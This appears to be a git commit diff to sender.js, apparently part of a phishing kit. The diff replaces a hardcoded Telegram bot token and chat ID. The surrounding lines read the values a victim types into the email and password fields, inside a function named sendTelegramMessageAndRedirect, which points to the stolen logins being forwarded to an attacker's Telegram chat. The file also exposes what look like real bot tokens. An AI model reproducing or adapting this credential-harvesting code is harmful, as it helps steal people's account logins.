ddfb81bc0412ac5f211b67cfa479d8716901d0e6
Bellmail <tlee17522@gmail.com>
2024-12-12 15:25:07 -0800

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
-  const chatId = 5710607863; // Replace with your chat ID
+  const telegramBotToken = "7018256337:AAHX2iHAfXZLAbe8ZYjZfvwDV6EQfYqYX1Y"; // Replace with your Telegram bot token
+  const chatId = 7002450305; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
